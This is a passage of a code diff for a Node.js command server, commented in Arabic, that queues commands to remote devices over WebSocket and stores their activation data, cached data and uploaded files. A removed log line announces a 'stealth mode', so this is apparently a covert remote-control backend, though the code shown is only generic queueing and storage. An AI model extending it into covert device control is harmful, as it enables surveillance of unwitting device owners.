+    
+    if (device) {
+      device.lastSeen = new Date();
+      device.status = 'online';
+      this.updateDeviceStatus(deviceId, 'online');
+    }
+  }
+
+  handleActivationConfirmation(message) {
+    const { data } = message;
+    this.saveActivationData(data);
+    
+    // إرسال الأوامر المعلقة
+    if (data.deviceId) {
+      this.sendPendingCommands(data.deviceId);
+    }
+  }
+
+  handlePendingCommandResult(message) {
+    const { command, timestamp } = message;
+    console.log('نتيجة أمر معلق:', command);
+  }
+
+  handleCachedData(message) {
+    const { key, data, timestamp } = message;
+    console.log('بيانات مخزنة محلياً:', key);
+    
+    // حفظ البيانات المخزنة
+    this.saveCachedData(key, data);
+  }
+
+  handleDeviceDisconnection(deviceId) {
+    const device = this.devices.get(deviceId);
+    if (device) {
+      device.status = 'offline';
+      device.ws = null;
+      this.updateDeviceStatus(deviceId, 'offline');
+      
+      console.log(`انقطع الاتصال بالجهاز: ${deviceId}`);
+    }
+  }
+
+  addPendingCommand(deviceId, command, parameters) {
+    if (!this.pendingCommands.has(deviceId)) {
+      this.pendingCommands.set(deviceId, []);
+    }
+    
+    const pendingCommand = {
+      id: this.generateCommandId(),
+      deviceId: deviceId,
+      command: command,
+      parameters: parameters || {},
+      timestamp: Date.now(),
+      attempts: 0
+    };
+    
+    this.pendingCommands.get(deviceId).push(pendingCommand);
+    this.savePendingCommand(pendingCommand);
+  }
+
+  sendPendingCommands(deviceId) {
+    const device = this.devices.get(deviceId);
+    if (!device || !device.ws) return;
+    
+    const pendingCommands = this.pendingCommands.get(deviceId) || [];
+    
+    if (pendingCommands.length > 0) {
+      console.log(`إرسال ${pendingCommands.length} أمر معلق للجهاز ${deviceId}`);
+      
+      pendingCommands.forEach(command => {
+        try {
+          device.ws.send(JSON.stringify({
+            id: command.id,
+            action: command.command,
+            parameters: command.parameters,
+            timestamp: Date.now()
+          }));
+          
+          command.attempts++;
+          
+          if (command.attempts >= 3) {
+            console.log(`تم تجاوز الحد الأقصى للمحاولات للأمر: ${command.command}`);
+            this.removePendingCommand(deviceId, command.id);
+          }
+        } catch (error) {
+          console.error('خطأ في إرسال الأمر المعلق:', error);
+        }
+      });
+      
+      // مسح الأوامر المرسلة بنجاح
+      this.pendingCommands.set(deviceId, []);
+    }
+  }
+
+  processPendingCommands() {
+    this.pendingCommands.forEach((commands, deviceId) => {
+      const device = this.devices.get(deviceId);
+      if (device && device.ws && device.status === 'online') {
+        this.sendPendingCommands(deviceId);
+      }
+    });
+  }
+
+  generateCommandId() {
+    return `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+  }
+
+  saveDeviceToDatabase(device) {
+    try {
+      const devicesData = Array.from(this.devices.values()).map(d => ({
+        deviceId: d.deviceId,
+        status: d.status,
+        lastSeen: d.lastSeen,
+        deviceInfo: d.deviceInfo,
+        capabilities: d.capabilities,
+        timestamp: d.timestamp
+      }));
+      
+      fs.writeFileSync(this.devicesFilePath, JSON.stringify(devicesData, null, 2));
+    } catch (error) {
+      console.error('خطأ في حفظ بيانات الجهاز:', error);
+    }
+  }
+
+  updateDeviceStatus(deviceId, status) {
+    const device = this.devices.get(deviceId);
+    if (device) {
+      device.status = status;
+      device.lastSeen = new Date();
+      this.saveDeviceToDatabase(device);
+    }
+  }
+
+  saveCommandToHistory(deviceId, command, parameters, status) {
+    const commandRecord = {
+      id: this.generateCommandId(),
+      deviceId: deviceId,
+      command: command,
+      parameters: parameters || {},
+      status: status,
+      timestamp: Date.now()
+    };
+    
+    this.commandHistory.push(commandRecord);
+  }
+
+  updateCommandInHistory(commandId, status, result, error) {
+    const command = this.commandHistory.find(cmd => cmd.id === commandId);
+    if (command) {
+      command.status = status;
+      command.result = result;
+      command.error = error;
+      command.executedAt = Date.now();
+    }
+  }
+
+  saveDataUpdate(dataUpdate) {
+    this.dataUpdates.push(dataUpdate);
+  }
+
+  saveFileRecord(fileRecord) {
+    this.uploadedFiles.push(fileRecord);
+  }
+
+  savePendingCommand(command) {
+    // حفظ في الملف المحلي
+    try {
+      const commandsData = [];
+      this.pendingCommands.forEach((commands, deviceId) => {
+        commands.forEach(cmd => {
+          commandsData.push(cmd);
+        });
+      });
+      
+      fs.writeFileSync(this.commandsFilePath, JSON.stringify(commandsData, null, 2));
+    } catch (error) {
+      console.error('خطأ في حفظ الأمر المعلق:', error);
+    }
+  }
+
+  removePendingCommand(deviceId, commandId) {
+    const commands = this.pendingCommands.get(deviceId);
+    if (commands) {
+      const index = commands.findIndex(cmd => cmd.id === commandId);
+      if (index !== -1) {
+        commands.splice(index, 1);
+      }
+    }
+  }
+
+  saveActivationData(data) {
+    try {
+      const activationFilePath = path.join(this.localStoragePath, 'activations.json');
+      let activations = [];
+      
+      if (fs.existsSync(activationFilePath)) {
+        activations = JSON.parse(fs.readFileSync(activationFilePath, 'utf8'));
+      }
+      
+      activations.push({
+        ...data,
+        receivedAt: Date.now()
+      });
+      
+      fs.writeFileSync(activationFilePath, JSON.stringify(activations, null, 2));
+    } catch (error) {
+      console.error('خطأ في حفظ بيانات التفعيل:', error);
+    }
+  }
+
+  saveCachedData(key, data) {
+    try {
+      const cachedDataPath = path.join(this.localStoragePath, 'cached-data.json');
+      let cachedData = {};
+      
+      if (fs.existsSync(cachedDataPath)) {
+        cachedData = JSON.parse(fs.readFileSync(cachedDataPath, 'utf8'));
+      }
+      
+      cachedData[key] = {
+        data: data,
+        timestamp: Date.now()
+      };
+      
+      fs.writeFileSync(cachedDataPath, JSON.stringify(cachedData, null, 2));
+    } catch (error) {
+      console.error('خطأ في حفظ البيانات المخزنة:', error);
+    }
+  }
+
+  savePersistentData() {
+    try {
+      // حفظ الملفات
+      fs.writeFileSync(this.filesFilePath, JSON.stringify(this.uploadedFiles, null, 2));
+      
+      // حفظ البيانات
+      fs.writeFileSync(this.dataFilePath, JSON.stringify(this.dataUpdates, null, 2));
+      
+      console.log('تم حفظ البيانات المحلية');
+    } catch (error) {
+      console.error('خطأ في حفظ البيانات المحلية:', error);
+    }
+  }
+
+  cleanupOldData() {
+    try {
+      const now = Date.now();
+      const sevenDays = 7 * 24 * 60 * 60 * 1000;
+      
+      // تنظيف التاريخ
+      this.commandHistory = this.commandHistory.filter(cmd => 
+        now - cmd.timestamp < sevenDays
+      );
+      
+      // تنظيف البيانات
+      this.dataUpdates = this.dataUpdates.filter(data => 
+        now - data.timestamp < sevenDays
+      );
+      
+      // تنظيف الملفات
+      this.uploadedFiles = this.uploadedFiles.filter(file => 
+        now - new Date(file.uploadDate).getTime() < sevenDays
+      );
+      
+      console.log('تم تنظيف البيانات القديمة');
+    } catch (error) {
+      console.error('خطأ في تنظيف البيانات القديمة:', error);
+    }
+  }
+
+  cleanupInactiveDevices() {
+    try {
+      const now = Date.now();
+      const inactiveThreshold = 30 * 60 * 1000; // 30 دقيقة
+      
+      this.devices.forEach((device, deviceId) => {
+        if (device.lastSeen && (now - device.lastSeen.getTime() > inactiveThreshold)) {
+          device.status = 'inactive';
+          this.updateDeviceStatus(deviceId, 'inactive');
+        }
+      });
+    } catch (error) {
+      console.error('خطأ في تنظيف الأجهزة غير النشطة:', error);
+    }
+  }
+
+  start(port = 4000) {
+    this.server.listen(port, () => {
+      console.log(`🚀 خادم الأوامر يعمل على المنفذ ${port}`);
+      console.log('✅ تم تهيئة النظام بنجاح');
+      console.log('🔒 وضع الأمان مفعل');
+      console.log('💾 التخزين المحلي مفعل');
+    });
+  }
 }
 
-// تهيئة النظام
-createRequiredDirectories();
+// إنشاء وتشغيل الخادم
+const commandServer = new CommandServer();
+commandServer.start(4000);
 
-// تنظيف دوري
-setInterval(cleanupInactiveDevices, 10 * 60 * 1000); // كل 10 دقائق
-
-// تشغيل الخادم
-const PORT = process.env.PORT || 4000;
-server.listen(PORT, () => {
-    console.log(`🚀 خادم التحكم يعمل على http://localhost:${PORT}`);
-    console.log('✅ تم تهيئة النظام بنجاح');
-    console.log('🔒 وضع الأمان مفعل');
-    console.log('👻 وضع التخفي مفعل');
-    console.log(`📊 الأجهزة المتصلة: ${connectedDevices.size}`);
-});
+module.exports = CommandServer;
